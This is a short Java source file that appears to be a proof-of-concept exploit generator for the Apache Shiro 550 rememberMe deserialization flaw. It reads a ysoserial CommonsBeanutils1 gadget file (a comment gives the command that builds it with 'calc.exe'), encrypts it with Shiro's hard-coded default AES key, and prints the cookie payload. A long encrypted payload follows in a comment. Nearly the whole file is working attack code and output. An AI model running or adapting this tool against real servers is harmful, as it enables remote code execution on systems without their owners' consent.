package com.example.shiro550.exp;

import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.codec.CodecSupport;
import org.apache.shiro.util.ByteSource;
import org.apache.shiro.codec.Base64;
import org.apache.shiro.io.DefaultSerializer;

import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.nio.file.Paths;

public class GenPayload {
    public static void main(String[] args) throws Exception {
        byte[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath("D:\\EXP\\poc.ser")); //java -jar ysoserial-master-30099844c6-1.jar CommonsBeanutils1 "calc.exe" > poc.ser

        AesCipherService aes = new AesCipherService();
        byte[] key = Base64.decode(CodecSupport.toBytes("kPH+bIxk5D2deZiIxcaaaA=="));

        ByteSource ciphertext = aes.encrypt(payloads, key);
        System.out.printf(ciphertext.toString());
        //gnyKHRqlL607wxMRTXgh7AAsHuUx6PD8f+5JtkJIw4z/OsVFJ7qfZdzQgPM4P1zbV20paKNR0+wXHnrVLPQgRle3npgcsMO0npXGmvUwrpCCybxZ+stPX03Fpb66a6ka3YUXPNZ4LYi3fMAtMX/ByiO/zvJp+seY1XDjNCiqDDCjUngAd2s9I189ebL6GT1o9CVGsAznUnENBP11WxDYeeTrmJXPwA3/Ybxfu1LZwL/VKSfTRyVYHHizoncr9yFWdwNYO+FMbnWMGXCbqxvzhrDRTaP1aIRoFCFuposVs4NuK+wawip4+5RCL8/tf05E0KkzPC22QIfXQzoKJg7kbBVpqbsofUzwJW7sPBYiIjKHFN0NaPzBCSHt0Gm7yTSOCGby2UtSx+eAW7r26ySBeFm97Uh/M1ocgcNgLNCUBp5AG36f0DGB9+6pKuyJBLwA0q1h6YYYxJlHmPXKAKYakC+5eKqfVluW+4eVJifaoLQ1J9TQ86SeVvehWN9HHaIW7hV2ERotWfmq5AldT9vpBQbBWC04e99Hm9EzdtNeqooGQO+XNih9Mxcs4MV9npEtlwbQ96BJMjou52FdM/PErGjudf8FTctT4D6uAANNBjb1psw16NwVCRG/9zcV9/GX2BpTm8JSAUq35PB7XIbqH7JhLEPEA0eZKf8wJqjtvjxCL3IAmIIwz6gl1mqoUtrxadjygkL7h/PfpyKc0Fjpv7CmVxtdmhmKEiqZb95ximlbOrmQh/j8YR1ZAHeVUMBskvgE8WVm2VRFYR7CtSSjUGFj5Kx7/PI8pefN1AKvre+C3uJs12uTjI7n3EyXRC2UjKchfPxTZ+hAPfg7/NeRi4PgUpSlimNiPnsvkCZ4VUfMcWdok9eNutYVc9nh8H8IEmntuENqTernWdki/Aoo95/p1lDRC6VMIqGxNgXaU4KhTSkEdCYfCCvg5lWiAs1/DxVDw2bG4hQTxAnhbeucRzAIggYyCWQxB1UVYVe9Llz0CZuHC2oFTMCccYfKjIDOzdtyJYk3I2coGgSfSU7DiTQRu0h2Vs4lb8nNp425rDvJhvPrSSNiHyUqiV2NrR9DDKXsyv+PTCagxzezQr/Fe0vuD/+avX/WkyLAK6HCO9rKZQESIlrGt06eolCogQDJSzqbOWufnM7qvvIURzeW82smZyGHwpLKrQodaMdgCtWCZnd0Pqz/kx3Zze83WqCKv1kzz+VtlgegaY4sfThbnhHpPIiw8Vak2WYb7MgbpN9NjsmbWORAu4bs0QcvueRC0yDbufONphMM/0ZBqnQH8p7kbE3GtCVcZjGVq2f+xMBO1dUjJ5TjuANX2zfwn0sGJborMQoNpSDMcT4S32D/yXPm4k/lvXXEzxaKV0kktiSLNODm7un4uxjqFH8v0ItkPKvXq+Wydokb2Ik9igYKD6/5MOnIUuZcfShbmYu7Ocho02tEqNGTdJ846QKUhErd4TT2B4Nm5Y07SY/aCNor4xapLinDN2lpsmvlmk6fwW3xCUduzUxX0K8LKwhjknGrlgXVPpAbI2Nk4pXN8uePMmj9gp3gKo6FdFlw7fhNoKariJTMbnq4l6oPfLCaryc9IZ7YQTnukFPdh0gq9f+pfC/04LghoHJEk4RloibjoYrNeW7wwadr9mB7e34NKvEMvGaXyVfO8CIpm7cDQWbFoG1NvaC+qOQsk+yJNZR5req4UfWBIBQy/RKw8qT6IpqmqyTwHuviqNvJcRDBp/KeRbeUGA/9qt56fdpHokZNKnE3+mdexd0+rhym7/yx1rlWO/TLLmiQM+ETddCw2f0azT63u9WAkDfEZ8SagudFUw+u24d6c4R2ANw4kW5PXfSYxoL3YI4cHtBHAQQWktddrS5fE4reNAMlCwIugWK8UWLtxWaFEiITdVhf0cZsKbVUTQt91a03y8CVzj5y8f5t6VPOmC46M6Dyxufg+1KmmZB50Sn1MaMD6auxRbYFQgKzaeSVf26t1e63Gg7nDq+bKWwf3+PAJR5onNEqIVc2xJ504SdZCsbkafcJwNk8r/1iKkxjzD+9bee7qZQgA1VuzHrRlIubkpUsaN/pRFPvSiYNTT/5Kv8JrCbdxVp+FLy/du0bIF+9jfcSV3SKvwlhxPeGhg6HkJTnb4JlUJThQZn67R9YpFubqJtTBJEH9unNptM/r0UOwHrtF3GdnOxtPH/vRXnVz92GnIcsUf3jK3Fub1U8Tu3canOlsj/pMPjK4ykn3wWjUFGGRDJcfaVrEDWwVCJJNUFqlyb+NBOqMccRw5Dd49w4QI1+Wstt60EawofX0QSqwItwc0nCfA1DJ0z4YYOt9f5G9pn5JhXMbCyahHb7Hv49VXsSNtrzHJf+nbN7xeUzW2FytY3+wrpgX6BAM4hv7fNzlsJw2ybrZ+Xr6EYwGGmg9CbJAyRzhiNL4MsCO7sywvwYGhoA+92gxSd9yZPUf7SQMt3bZDDRT9UObfLB93Uw3oPJTVmDDDRBC6dKO82+Tfw8RtUg23WUlQWgVfza0lJVOESVmm9SC9A8al3fZ0UqiDTX0eUuJ+KluKiqFlsc7GpxA4KunMyls0nbVo3trmkM1/QQwxnl5lBx7BfniJ25TYMSCOW9VJTeAMJWpHHG4P32yxiy3Wu1KmyGLowZh12jfD9P4xK2a9wityaUcmG+MwecAUiS7QWRmHITrESTFj1I1NgY4DdQ///eQ6faBHGDNrqupwVvRBt3eMe9mncTVDcetz7QTzHRrFJeUVHYeGva5fOmWZfmAmJj6RvWJIipo++9kHhJRGI1ToijDxn2bqcR3aXEa/laZtHOTNZAk+QngMCNWk/RlRlivY8VYpcOKdU2vvqa4FKwR9tk5a6+/JZ3VwEWKo9zQf6ZZPGr0QZiZJyGHcRsTbyTloWC3d49+njmZxrv/1CEJ0I/ygDrZAOhxz0keQB90rXico9Rhk2P3XCM5X6zsaybx10hIB9w/d1dRT4jrsy34Mhwa9dY2uWIfXvYqj9iS3RA/SgP9HobHhc1Ly14xp40IZvR3qW/qYzU9P4NeljN2bVb5VlwogfIKGMjD7ZaXMZf24FDWBYbDDfoBNpcpuuJIayc1LocZRttHxs9KqIQ807pYLRn18uNAQpdvLdZi8z1pHUvpNmYSro3bcMNvN92jV1Hs6EGreoHI7IS5DDEzFbCNW179erKmnG0fv75HyBijnod0/fiR5scxviLnTkcmws4PpckJqarOvQE2+ocoahG1f/iIHqNSE1gCidhFROE+i/lDG0hle2svEDWvFDWMcJqJlEvfX6JtwHYJdqrEPtUaus+3MgTI0CuDpYbmLl98QIKPRydzWvgMeeP7e1ukolz2tkx43JOrLCDmaWNMffEe1WtNjIfFVjqg9cgBrXIG3nwmoRptvfdY3sx5ODa8jgaP/5ItYjotvV41PRgsTc1wbH2U1tg0EGmQ791KdHHSMRpvMpGLJjm36Df8MObu44YeQsjhJPRAO0f7Nz3ePXzOtqy4j5N5FsCA1XX6qRaOpcAj5s/fEBCntQZm8rrlMwkHAH22Dh92qA92B+iEvFHYMKVTTDLZDe2zrb7xVuZUI1egO7h27CCD9GDgBqcCxCOVyFqrxExMMdkLOtPk19THk8aT8IzMhmxZVIHMDBsBrjgfXxgwb6GCOrrAfN3aqmWY0+WUjZjeWCaHtBy2rtjURJOVqE/nBIEmyQ1CpQSH9hT8u9UPGqHkx97bQ==
    }
}
